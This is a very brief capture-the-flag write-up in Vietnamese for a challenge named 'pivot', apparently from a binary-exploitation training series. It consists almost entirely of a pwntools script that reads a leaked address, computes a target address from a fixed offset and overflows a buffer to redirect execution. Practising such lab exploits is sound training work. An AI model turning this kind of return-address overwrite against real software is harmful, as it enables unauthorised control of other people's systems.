# pivot [challenge 7]


chall nay ez qua nen minh de scripts thoi

```python
from pwn import *

r = process("./pivot")
#gdb.attach(r,api = True)
payload = b""

leak = int(r.recv().split(b"to pivot: ")[1].split(b"\nSend")[0],16)
log.info(f"Leak: {hex(leak)}")

ret2win = leak + 0x229b71

log.info(f"ret2win: {hex(ret2win)}")

r.sendline(b"1")
r.recv()
r.sendline(b"a"*40+p64(ret2win))


r.interactive()

```